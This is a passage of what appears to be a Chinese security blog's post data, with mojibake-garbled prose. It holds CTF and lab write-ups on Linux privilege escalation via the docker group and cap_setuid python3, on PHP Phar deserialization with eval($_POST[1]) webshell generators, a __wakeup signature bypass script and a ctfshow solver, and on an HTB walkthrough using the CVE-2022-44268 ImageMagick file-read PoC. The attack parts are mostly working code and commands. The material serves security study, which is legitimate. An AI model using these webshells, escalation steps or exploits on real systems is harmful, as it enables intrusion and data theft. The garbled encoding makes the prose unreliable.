dockerâ”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ cat /etc/group | grep &quot;docker&quot; docker:x:993:kali éšåä½¿ç”¨docker runæ¥å…è®¸alpineé•œåƒï¼Œvå‚æ•°è¿›è¡ŒæŒ‚è½½ï¼Œæ˜¯å°†å®¿ä¸»æœºçš„rootç›®å½•æŒ‚è½½åˆ°alpineçš„mntä¸‹ï¼Œä½¿ç”¨å†’å·åˆ†éš”ã€‚iå‚æ•°æ˜¯ä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œtå‚æ•°æ˜¯åˆ†é…ä¸€ä¸ªttyç»ˆç«¯ï¼Œitä¸€èˆ¬ç»“åˆä½¿ç”¨ï¼Œå³ä¿æŒé€šè®¯ç»ˆç«¯çš„æ‰“å¼€ã€‚ è¿™æ—¶è®¿é—®dockeré•œåƒalpineï¼Œå°±ç›¸å½“äºè®¿é—®å®¿ä¸»æœºçš„rootç›®å½•ï¼Œæƒé™å˜æˆäº†root,å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ 12345â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ docker run -v /root:/mnt -it alpine / # cd /mnt/mnt # whoamiroot capabilityææƒcapabilityç¿»è¯‘ä¸ºèƒ½åŠ›çš„æ„æ€ï¼Œlinuxä¸­èƒ½åŠ›çš„æ¦‚å¿µå’Œsuidç±»ä¼¼ï¼Œæ˜¯ç”¨æ¥è®©æ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥åšè¶…çº§ç”¨æˆ·çš„å·¥ä½œï¼Œä»è€Œè®¾ç½®çš„ä¸€ä¸ªæœºåˆ¶ï¼ŒåŸæ¥linuxåˆ†çš„æ˜¯æ™®é€šç”¨æˆ·å’Œè¶…çº§ç”¨æˆ·ï¼Œåæ¥åŠ äº†èƒ½åŠ›ï¼Œå³èµ‹äºˆæŸæŸè´¦å·èƒ½åŠ›ï¼Œè¿™ä¸ªè´¦å·æœ‰èƒ½åŠ›äº†ï¼Œå°±å¯ä»¥å»åšäº‹äº†ã€‚ capabilityå¯åˆ†å‰²rootæƒé™ï¼ŒæŠŠrootç‰¹æƒåˆ†å‰²æˆä¸åŒçš„èƒ½åŠ›ï¼Œç„¶åç»™ä¸æ™®é€šç”¨æˆ·ä¸åŒçš„èƒ½åŠ›ï¼Œæ¯ä¸€ç§èƒ½åŠ›éƒ½ä»£è¡¨ç€ä¸€ç§ç‰¹æƒã€‚ä¸‹é¢æ˜¯ä¸€äº›èƒ½åŠ›å‚è€ƒï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657- CAP_CHOWN:ä¿®æ”¹æ–‡ä»¶å±ä¸»çš„æƒé™- CAP_DAC_OVERRIDE:å¿½ç•¥æ–‡ä»¶çš„DACè®¿é—®é™åˆ¶- CAP_DAC_READ_SEARCH:å¿½ç•¥æ–‡ä»¶è¯»åŠç›®å½•æœç´¢çš„DACè®¿é—®é™åˆ¶- CAP_FOWNERï¼šå¿½ç•¥æ–‡ä»¶å±ä¸»IDå¿…é¡»å’Œè¿›ç¨‹ç”¨æˆ·IDç›¸åŒ¹é…çš„é™åˆ¶- CAP_FSETID:å…è®¸è®¾ç½®æ–‡ä»¶çš„setuidä½- CAP_KILL:å…è®¸å¯¹ä¸å±äºè‡ªå·±çš„è¿›ç¨‹å‘é€ä¿¡å·- CAP_SETGID:å…è®¸æ”¹å˜è¿›ç¨‹çš„ç»„ID- CAP_SETUID:å…è®¸æ”¹å˜è¿›ç¨‹çš„ç”¨æˆ·ID- CAP_SETPCAP:å…è®¸å‘å…¶ä»–è¿›ç¨‹è½¬ç§»èƒ½åŠ›ä»¥åŠåˆ é™¤å…¶ä»–è¿›ç¨‹çš„èƒ½åŠ›- CAP_LINUX_IMMUTABLE:å…è®¸ä¿®æ”¹æ–‡ä»¶çš„IMMUTABLEå’ŒAPPENDå±æ€§æ ‡å¿—- CAP_NET_BIND_SERVICE:å…è®¸ç»‘å®šåˆ°å°äº1024çš„ç«¯å£- CAP_NET_BROADCAST:å…è®¸ç½‘ç»œå¹¿æ’­å’Œå¤šæ’­è®¿é—®- CAP_NET_ADMIN:å…è®¸æ‰§è¡Œç½‘ç»œç®¡ç†ä»»åŠ¡- CAP_NET_RAW:å…è®¸ä½¿ç”¨åŸå§‹å¥—æ¥å­—- CAP_IPC_LOCK:å…è®¸é”å®šå…±äº«å†…å­˜ç‰‡æ®µ- CAP_IPC_OWNER:å¿½ç•¥IPCæ‰€æœ‰æƒæ£€æŸ¥- CAP_SYS_MODULE:å…è®¸æ’å…¥å’Œåˆ é™¤å†…æ ¸æ¨¡å—- CAP_SYS_RAWIO:å…è®¸ç›´æ¥è®¿é—®/devport,/dev/mem,/dev/kmemåŠåŸå§‹å—è®¾å¤‡- CAP_SYS_CHROOT:å…è®¸ä½¿ç”¨chroot()ç³»ç»Ÿè°ƒç”¨- CAP_SYS_PTRACE:å…è®¸è·Ÿè¸ªä»»ä½•è¿›ç¨‹- CAP_SYS_PACCT:å…è®¸æ‰§è¡Œè¿›ç¨‹çš„BSDå¼å®¡è®¡- CAP_SYS_ADMIN:å…è®¸æ‰§è¡Œç³»ç»Ÿç®¡ç†ä»»åŠ¡ï¼Œå¦‚åŠ è½½æˆ–å¸è½½æ–‡ä»¶ç³»ç»Ÿã€è®¾ç½®ç£ç›˜é…é¢ç­‰- CAP_SYS_BOOT:å…è®¸é‡æ–°å¯åŠ¨ç³»ç»Ÿ- CAP_SYS_NICE:å…è®¸æå‡ä¼˜å…ˆçº§åŠè®¾ç½®å…¶ä»–è¿›ç¨‹çš„ä¼˜å…ˆçº§- CAP_SYS_RESOURCE:å¿½ç•¥èµ„æºé™åˆ¶- CAP_SYS_TIME:å…è®¸æ”¹å˜ç³»ç»Ÿæ—¶é’Ÿ- CAP_SYS_TTY_CONFIG:å…è®¸é…ç½®TTYè®¾å¤‡- CAP_MKNOD:å…è®¸ä½¿ç”¨mknod()ç³»ç»Ÿè°ƒç”¨- CAP_LEASE:å…è®¸ä¿®æ”¹æ–‡ä»¶é”çš„FL_LEASEæ ‡å¿— åœ¨è®¾ç½®ç¨‹åºèƒ½åŠ›æ—¶ï¼Œæœ‰ä¸‰ä¸ªé€‰é¡¹å¯é€‰ï¼š 1ï¼Œinheritableï¼Œç®€ç§°iï¼Œè¡¨ç¤ºæ˜¯å¦å¯ç»§æ‰¿ã€‚ 2ï¼Œpermittedï¼Œç®€ç§°pï¼Œè¡¨ç¤ºæ˜¯å¦å…è®¸ä½¿ç”¨ã€‚ 3ï¼Œeffectiveï¼Œç®€ç§°eï¼Œè¡¨ç¤ºç‰¹æƒæ˜¯å¦æœ‰æ•ˆã€‚ setcapå‘½ä»¤ç”¨æ¥è®¾ç½®èƒ½åŠ›ï¼Œä¾‹å¦‚setcap cap_setuid+ep /home/demo/python3ï¼Œå°±è¡¨ç¤ºhome/demo/python3è¿™ä¸ªç¨‹åºæ·»åŠ äº†setuidèƒ½åŠ›ï¼Œå³æ”¹å˜è¿›ç¨‹uidçš„èƒ½åŠ›ï¼Œ+epå°±è¡¨ç¤ºèƒ½åŠ›æœ‰æ•ˆï¼Œä¸”å…è®¸ä½¿ç”¨ã€‚ capabilityæµ‹è¯• setcapè®¾ç½®èƒ½åŠ›ï¼Œgetcatè¯»å–èƒ½åŠ›ã€‚ getcapé€šè¿‡rå‚æ•°æ¥è¯»å–æŒ‡å®šç›®å½•ä¸‹æœ‰èƒ½åŠ›çš„ç¨‹åºã€‚ 123456789â”Œâ”€â”€(kaliã‰¿kali)-[/tmp]â””â”€$ echo &quot;capability&quot; &gt; capability â”Œâ”€â”€(kaliã‰¿kali)-[/tmp]â””â”€$ sudo setcap cap_setuid+ep /tmp/capabilityâ”Œâ”€â”€(kaliã‰¿kali)-[/tmp]â””â”€$ getcap -r /tmp 2&gt;/dev/null /tmp/capability cap_setuid=ep èƒ½åŠ›æ»¥ç”¨å¯¼è‡´çš„ææƒ ä¾‹å¦‚ç®¡ç†å‘˜è¦ä¸ºpython3ç¨‹åº(å…¶ä»–ç¨‹åºç±»ä¼¼)è®¾ç½®è¶…çº§æƒé™ç»™zixydç”¨æˆ·ï¼Œä½†æ²¡æœ‰ç”¨suidæˆ–sudoæˆæƒï¼Œè€Œç”¨çš„æ˜¯capabilitiesï¼Œé€šè¿‡çš„æ˜¯ä»¥ä¸‹å‘½ä»¤æ¥è®¾ç½®çš„ã€‚ å› ä¸ºrootåªæƒ³ç»™zixydç”¨æˆ·çš„python3èƒ½åŠ›ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯å°†ç¨‹åºå¤åˆ¶åˆ°äº†zixydç”¨æˆ·ä¸‹ï¼Œå¦‚æœç›´æ¥è®¾ç½®binä¸‹çš„python3ç¨‹åºï¼Œé‚£ä¹ˆæ„å‘³ç€ä»»ä½•ç”¨æˆ·éƒ½å…·æœ‰äº†ç›¸å…³èƒ½åŠ› 1234567891011121314151617181920â”Œâ”€â”€(zixydã‰¿kali)-[~]â””â”€$ cp /usr/bin/python3 .â”Œâ”€â”€(zixydã‰¿kali)-[~]â””â”€$ sudo setcap cap_setuid+ep ./python3â”Œâ”€â”€(zixydã‰¿kali)-[~]â””â”€$ ls -l-rwxr-xr-x 1 root zixyd 6754136 12æœˆ 8æ—¥ 13:19 python3â”Œâ”€â”€(zixydã‰¿kali)-[~]â””â”€$ getcap -r ./ 2&gt;/dev/null./python3 cap_setuid=epâ”Œâ”€â”€(zixydã‰¿kali)-[~]â””â”€$ ./python3 -c &quot;import os; os.setuid(0); os.system('/bin/bash')&quot;â”Œâ”€â”€(rootã‰¿kali)-[~]â””â”€# whoamiroot","link":"/2023/12/07/Linux%E6%8F%90%E6%9D%83/"},{"title":"Pharæ¼æ´","text":"ä»€ä¹ˆæ˜¯Pharjaræ˜¯å¼€å‘javaç¨‹åºçš„åº”ç”¨ï¼ŒåŒ…æ‹¬æ‰€æœ‰å¯æ‰§è¡Œï¼Œå¯è®¿é—®çš„æ–‡ä»¶æ‰“åŒ…ï¼Œæ–¹ä¾¿éƒ¨ç½²; pharæ˜¯phpé‡Œç±»ä¼¼jarçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶å¯¹äºphp5.3æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œpharåç¼€æ–‡ä»¶æ˜¯é»˜è®¤å¼€å¯æ”¯æŒçš„ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å®ƒ Pharç»“æ„stub pharæ–‡ä»¶æ ‡è¯†ï¼Œæ ¼å¼ä¸ºxxx&lt;?php xxx;HALT_COMPiLER0;?&gt;;(å¤´éƒ¨ä¿¡æ¯)manifestå‹ç¼©æ–‡ä»¶çš„å±æ€§ç­‰ä¿¡æ¯ï¼Œä»¥åºåˆ—åŒ–å­˜å‚¨ï¼šcontentså‹ç¼©æ–‡ä»¶çš„å†…å®¹ï¼›signatureç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼› Pharåè®®è§£ææ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘å¯¹nanifestå­—æ®µçš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–ï¼› å®éªŒä¸€(åŸºæœ¬çš„pharåˆ©ç”¨)åˆ›å»ºä¸€ä¸ªtest002.php 1234567891011121314&lt;?phphighlight_file(__FILE__);class zixyd { public $code; public function __destruct() { echo '_destruct() called!'.&quot;&lt;/br&gt;&quot;; eval($this-&gt;code); }}$filename = $_GET['file'];echo is_file($filename); åˆ›å»ºä¸€ä¸ªtest.phpç”¨æ¥ç”Ÿæˆphar;Pharéœ€è¦PHP &gt;=5.2åœ¨php.iniä¸­å°†phar.readonlyè®¾ä¸ºoffï¼Œå¦åˆ™ç”Ÿæˆpharæ–‡ä»¶æ—¶ä¼šæŠ¥é”™ æ‰§è¡Œtest.phpç”Ÿæˆpharæ–‡ä»¶ 1234567891011121314&lt;?phpclass zixyd { public $code=&quot;eval(\\$_POST[1]);&quot;;}@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new zixyd();$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering(); ç”Ÿæˆçš„phar.pharæ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼š 12345--phar.phar --.phar --.metadata.bin --signature.bin --stub.php 12#.metadata.binO:5:&quot;zixyd&quot;:1:{s:4:&quot;code&quot;;s:16:&quot;eval($_POST[1]);&quot;;} 12stub.php&lt;?php __HALT_COMPILER(); ?&gt; æœ€ç»ˆæˆåŠŸæ‰§è¡Œ å—å½±å“çš„å‡½æ•°123456789101112131415161718192021222324fileatimefilectimefile_existsfile_get_contentsfile_put_contentsfilefilegroupfopenfileinodefilemtimefileownerfilepermsis_diris_executableis_fileis_linkis_readableis_writableis_writeableparse_ini_filecopyunlinkstatreadfile ä¸€äº›ç»•è¿‡æ–¹å¼ä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶åœ¨å‰é¢åˆ†æpharçš„æ–‡ä»¶ç»“æ„æ—¶å¯èƒ½ä¼šæ³¨æ„åˆ°ï¼Œphpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯__HALT_COMPILER();?&gt;è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚ 1$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); ///è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦12345compress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txtphp://filter/resource=phar:///test.phar/test.txtphp://filter/read=convert.base64-encode/resource=phar://phar.phar å€¼å¾—æ³¨æ„çš„æ˜¯:é‚£äº›å¯ä»¥ä½¿å¾—pharæ–‡ä»¶çš„metadataååºåˆ—åŒ–çš„å‡½æ•°éœ€è¦æ”¯æŒcompress.bzip:æˆ–è€…php://filteråè®®ç­‰æ‰è¡Œï¼Œæ¯”å¦‚if_fileå°±ä¸è¡Œ ç»•è¿‡åç¼€æ£€æŸ¥å°†phar.pharæ›´æ”¹åç¼€ä¸å½±å“pharæ–‡ä»¶çš„æœ€ç»ˆæ‰§è¡Œ,æ‰€ä»¥è¿™ä¸€ç‚¹å¾ˆå¥½ç»•è¿‡ç™½åå• è¿‡æ»¤__HALT_COMPILER();å°†pharæ–‡ä»¶è¿›è¡Œgzipå‹ç¼© ï¼Œä½¿ç”¨å‹ç¼©åpharæ–‡ä»¶åŒæ ·ä¹Ÿèƒ½ååºåˆ—åŒ– (å¸¸ç”¨) linuxä¸‹ä½¿ç”¨å‘½ä»¤gzip phar.phar ç”Ÿæˆ phar æ–‡ä»¶ç­¾åä¿®æ”¹å¯¹äºæŸäº›æƒ…å†µï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹pharæ–‡ä»¶ä¸­çš„å†…å®¹è€Œè¾¾åˆ°æŸäº›éœ€æ±‚(æ¯”å¦‚è¦ç»•è¿‡__wakeupè¦ä¿®æ”¹å±æ€§æ•°é‡)ï¼Œè€Œä¿®æ”¹åçš„pharæ–‡ä»¶ç”±äºæ–‡ä»¶å‘ç”Ÿæ”¹å˜ï¼Œæ‰€ä»¥é¡»è¦ä¿®æ”¹ç­¾åæ‰èƒ½æ­£å¸¸ä½¿ç”¨ (__wakeupç»•è¿‡:åœ¨ PHP5 &lt; 5.6.25, PHP7 &lt; 7.0.10 çš„ç‰ˆæœ¬) ä»¥é»˜è®¤çš„sha1ç­¾åä¸ºä¾‹ï¼š 1234567891011from hashlib import sha1with open('phar.phar', 'rb') as file: f = file.read() # ä¿®æ”¹å†…å®¹åçš„pharæ–‡ä»¶,ä»¥äºŒè¿›åˆ¶æ–‡ä»¶å½¢å¼æ‰“å¼€ s = f[:-28] # è·å–è¦ç­¾åçš„æ•°æ®ï¼ˆå¯¹äºsha1ç­¾åçš„pharæ–‡ä»¶ï¼Œæ–‡ä»¶æœ«å°¾28å­—èŠ‚ä¸ºç­¾åçš„æ ¼å¼ï¼‰s = s.replace(b'3:{', b'4:{')# ç»•è¿‡__wakeuph = f[-8:] # è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†ï¼Œå„4ä¸ªå­—èŠ‚newf = s + sha1(s).digest() + h # æ•°æ® + ç­¾å + (ç±»å‹ + GBMB) with open('newPhar.phar', 'wb') as file: file.write(newf) # å†™å…¥æ–°æ–‡ä»¶ å®éªŒ 123456789101112131415161718192021&lt;?phperror_reporting(0);highlight_file(__FILE__);class zixyd { public $code; public function __wakeup(){ echo &quot;die&quot;; exid(0); } public function __destruct() { echo '_destruct() called!'.&quot;&lt;/br&gt;&quot;; eval($this-&gt;code); }}$filename = $_GET['file'];echo file_get_contents($filename); ç”Ÿæˆphar.pharæ–‡ä»¶ 1234567891011121314&lt;?phpclass zixyd { public $code=&quot;eval(\\$_POST[1]);&quot;;}@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new zixyd();$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering(); å¯ä»¥çœ‹åˆ°è¢«__wakeupæ‹¦æˆªäº† æ‰§è¡Œè„šæœ¬ï¼Œç»•è¿‡wakeup 123456789101112from hashlib import sha1with open('phar.phar', 'rb') as file: f = file.read()s = f[:-28]s = s.replace(b'1:{', b'2:{')h = f[-8:]newf = s + sha1(s).digest() + hwith open('newPhar.phar', 'wb') as file: file.write(newf) ç”ŸæˆnewPhar.pharï¼›æˆåŠŸç»•è¿‡ Pharåˆ©ç”¨æ¡ä»¶ pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚ è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚ æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ è¡¥å……Pharæ–‡ä»¶åŒ…å«ä¸Šé¢è®²çš„éƒ½æ˜¯pharååºåˆ—åŒ–ï¼›æœ¬é¢˜æ˜¯åˆ©ç”¨pharæ–‡ä»¶åŒ…å«ï¼›æ¥è‡ªctfshow-web803 12345678910111213&lt;?phperror_reporting(0);highlight_file(__FILE__);$file = $_POST['file'];$content = $_POST['content'];if(isset($content) &amp;&amp; !preg_match('/php|data|ftp/i',$file)){ if(file_exists($file.'.txt')){ include $file.'.txt'; }else{ file_put_contents($file,$content); }} å­˜åœ¨æ–‡ä»¶ä¸Šä¼ (å½“å‰ç›®å½•ç¡®å®æ˜¯/var/www/html;ä½†æ˜¯æ²¡æœ‰æƒé™)ï¼›æ–‡ä»¶åŒ…å«å¯¹åç¼€æœ‰é™åˆ¶ï¼Œå¹¶ä¸”æ–‡ä»¶åæœ‰è¿‡æ»¤ï¼› åˆ©ç”¨pharæ–‡ä»¶ç»•è¿‡ï¼›ç”Ÿæˆä¸€ä¸ªpharåé—¨æ–‡ä»¶ 1234567&lt;?php@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);$phar-&gt;stopBuffering(); å†åˆ©ç”¨pythonè„šæœ¬,å½“å‰æ²¡æœ‰æƒé™å¯ä»¥å†™ï¼Œé‚£å°±å†™åˆ°/tmpç›®å½•ä¸‹ 12345678import requestsurl = &quot;http://c2f01299-8a2b-4401-a26c-85e42c6142a3.challenge.ctf.show/&quot;data1 = {'file': '/tmp/phar.phar', 'content': open('phar.phar', 'rb').read()}data2 = {'file': 'phar:///tmp/phar.phar/test', 'content': '123', '1': 'system(&quot;cat f*&quot;);'}requests.post(url, data=data1)r = requests.post(url, data=data2)print(r.text) ç¡®å®æ²¡æœ‰å¯å†™çš„æƒé™ï¼Œ 123456'1': 'system(&quot;id&quot;);'uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)'1': 'system(&quot;ls -l /var/www&quot;);'drwxr-xr-x 1 root root 4096 Jan 28 05:31 htmldrwxr-xr-x 3 root root 4096 Sep 22 2020 localhost å…¶å®è¿™é‡Œä¸€å¼€å§‹æˆ‘æ˜¯æƒ³å€Ÿç”¨zipä¼ªåè®®åŒ…å«ç»•è¿‡çš„ï¼›åƒä¸‹é¢ä¸€æ · ç”Ÿæˆä¸€ä¸ªtest.txtæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼›å†å‹ç¼©ä¸ºtest.zipæ–‡ä»¶ 1&lt;?php phpinfo();?&gt; æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314 &lt;?phperror_reporting(0);highlight_file(__FILE__);$file = $_POST['file'];if( !preg_match('/php|data|ftp/i',$file)){// if(file_exists($file.'.txt')){ include $file.'.txt'; }else{ echo &quot;no&quot;; }//} å‘ç°æ˜¯å¯ä»¥æˆåŠŸçš„ï¼› ä½†æ˜¯è¿™ä¸ªåŠæ³•ä¸å¯ä»¥ç”¨æ¥è§£å†³web803ï¼›å› ä¸ºzipåè®®åœ¨file_existsåˆ¤æ–­ä¸å‡ºæ¥æ˜¯æ–‡ä»¶","link":"/2024/01/20/Phar%E6%BC%8F%E6%B4%9E/"},{"title":"Pilgrimage(HTB)","text":"ä¿¡æ¯æœé›†nmapç«¯å£æ‰«æå‘ç°22å’Œ80ç«¯å£ 123456789sudo nmap -p- --min-rate 10000 10.10.11.219Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-24 12:37 CSTWarning: 10.10.11.219 giving up on port because retransmission cap hit (10).Nmap scan report for pilgrimage.htb (10.10.11.219)Host is up (0.090s latency).Not shown: 63504 closed tcp ports (reset), 2029 filtered tcp ports (no-response)PORT STATE SERVICE22/tcp open ssh80/tcp open http nmapè¯¦ç»†æ‰«æå‘ç° pilgrimage.htb (10.10.11.219)ä»¥åŠGit repositoryï¼Œå°†åŸŸåå’ŒipåŠ å…¥/etc/hosts; 123456789101112131415161718192021222324252627sudo nmap -sT -sV -sC -O -p80 10.10.11.219Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-24 12:40 CSTStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 0.00% doneNmap scan report for pilgrimage.htb (10.10.11.219)Host is up (0.071s latency).PORT STATE SERVICE VERSION80/tcp open http nginx 1.18.0|_http-title: Pilgrimage - Shrink Your Images| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set| http-git: | 10.10.11.219:80/.git/| Git repository found!| Repository description: Unnamed repository; edit this file 'description' to name the...|_ Last commit message: Pilgrimage image shrinking service initial commit. # Please ...|_http-server-header: nginx/1.18.0Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: firewallRunning: Fortinet embeddedOS details: Fortinet FortiGate-50B or 310B firewallOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.74 seconds GITHACKæ‰«ææ ¹æ®ä¸Šä¸€æ­¥æœé›†çš„Git repository;çŸ¥é“æœ‰gitæ³„éœ²ï¼› 1python3 GitHack.py http://pilgrimage.htb/.git/ 123456789101112ls -alæ€»è®¡ 26968drwxr-xr-x 4 kali kali 4096 1æœˆ24æ—¥ 12:46 .drwxr-xr-x 5 kali kali 4096 1æœˆ24æ—¥ 12:45 ..drwxr-xr-x 6 kali kali 4096 1æœˆ24æ—¥ 12:45 assets-rw-r--r-- 1 kali kali 5538 1æœˆ24æ—¥ 12:46 dashboard.php-rw-r--r-- 1 kali kali 9250 1æœˆ24æ—¥ 12:46 index.php-rw-r--r-- 1 kali kali 6822 1æœˆ24æ—¥ 12:46 login.php-rw-r--r-- 1 kali kali 98 1æœˆ24æ—¥ 12:46 logout.php-rw-r--r-- 1 kali kali 27555008 1æœˆ24æ—¥ 12:46 magick-rw-r--r-- 1 kali kali 6836 1æœˆ24æ—¥ 12:46 register.phpdrwxr-xr-x 4 kali kali 4096 1æœˆ24æ—¥ 12:46 vendor userimagemagick 1234567891011121314151617181920212223242526#index.phpif ($_SERVER['REQUEST_METHOD'] === 'POST') { $image = new Bulletproof\\Image($_FILES); if($image[&quot;toConvert&quot;]) { $image-&gt;setLocation(&quot;/var/www/pilgrimage.htb/tmp&quot;); $image-&gt;setSize(100, 4000000); $image-&gt;setMime(array('png','jpeg')); $upload = $image-&gt;upload(); if($upload) { $mime = &quot;.png&quot;; $imagePath = $upload-&gt;getFullPath(); if(mime_content_type($imagePath) === &quot;image/jpeg&quot;) { $mime = &quot;.jpeg&quot;; } $newname = uniqid(); exec(&quot;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&quot; . $upload-&gt;getName() . $mime . &quot; -resize 50% /var/www/pilgrimage.htb/shrunk/&quot; . $newname . $mime); unlink($upload-&gt;getFullPath()); $upload_path = &quot;http://pilgrimage.htb/shrunk/&quot; . $newname . $mime; if(isset($_SESSION['user'])) { $db = new PDO('sqlite:/var/db/pilgrimage'); $stmt = $db-&gt;prepare(&quot;INSERT INTO `images` (url,original,username) VALUES (?,?,?)&quot;); $stmt-&gt;execute(array($upload_path,$_FILES[&quot;toConvert&quot;][&quot;name&quot;],$_SESSION['user'])); } header(&quot;Location: /?message=&quot; . $upload_path . &quot;&amp;status=success&quot;); } åˆ†æä»£ç ï¼Œå¯ä»¥çœ‹å‡ºå®ƒå¤„ç†ç½‘ç«™ä¸Šå›¾åƒçš„ä¸Šä¼ å’Œè°ƒæ•´å¤§å°ã€‚å®ƒè¿˜éªŒè¯ç”¨æˆ·æ˜¯å¦ç»è¿‡èº«ä»½éªŒè¯å¹¶è¿”å›ä»–ä»¬çš„ç”¨æˆ·åã€‚å¦‚æœè¯·æ±‚æ˜¯ POST æ–¹æ³•å¹¶ä¸”å‘é€å›¾åƒä»¥è°ƒæ•´å¤§å°ï¼Œåˆ™ä»£ç ä¼šå¤„ç†è¯¥å›¾åƒï¼Œå°†å…¶ä¿å­˜åˆ°ç‰¹å®šä½ç½®ï¼Œå¹¶å°†ä¿¡æ¯è®°å½•åœ¨æ•°æ®åº“ä¸­ã€‚éšåï¼Œç”¨æˆ·è¢«é‡å®šå‘åˆ°åŸºäºè¯¥è¿‡ç¨‹çš„ç»“æœæ˜¾ç¤ºæˆåŠŸæˆ–å¤±è´¥æ¶ˆæ¯çš„é¡µé¢ã€‚ è¯¥ä»£ç åˆ©ç”¨ ImageMagickï¼ˆç‰¹åˆ«æ˜¯â€œmagick Convertâ€å‘½ä»¤ï¼‰æ¥è°ƒæ•´ä¸Šä¼ æ–‡ä»¶çš„å¤§å°å¹¶å°†å…¶ä¿å­˜åœ¨ /shrunk è·¯å¾„ä¸­ ImageMagickä»å‘½ä»¤è¡Œè°ƒç”¨magickï¼Œæ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æºè·¨å¹³å°è½¯ä»¶å¥—ä»¶ï¼Œç”¨äºæ˜¾ç¤ºã€åˆ›å»ºã€è½¬æ¢ã€ä¿®æ”¹å’Œç¼–è¾‘å…‰æ …å›¾åƒ æŸ¥çœ‹magickç‰ˆæœ¬å¾—çŸ¥7.1.0-49,æ­¤ç‰ˆæœ¬å­˜åœ¨CVE-2022-44268ï¼Œä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼› 1234567./magick --versionVersion: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.orgCopyright: (C) 1999 ImageMagick Studio LLCLicense: https://imagemagick.org/script/license.phpFeatures: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlibCompiler: gcc (7.5) ç›´æ¥åˆ©ç”¨poc 12git clone https://github.com/voidz0r/CVE-2022-44268cargo run &quot;/etc/passwd&quot; Cargo æ˜¯Rust ç¼–ç¨‹è¯­è¨€çš„æ„å»ºå’Œä¾èµ–ç®¡ç†å·¥å…·ã€‚Cargo ä¸º Rust é¡¹ç›®æä¾›æ„å»ºã€æµ‹è¯•å’Œä¾èµ–ç®¡ç†åŠŸèƒ½ã€‚ ä¸Šä¼ ç”Ÿæˆçš„image.pngå›¾ç‰‡ï¼Œå¹¶ä¸‹è½½ä¸‹æ¥ 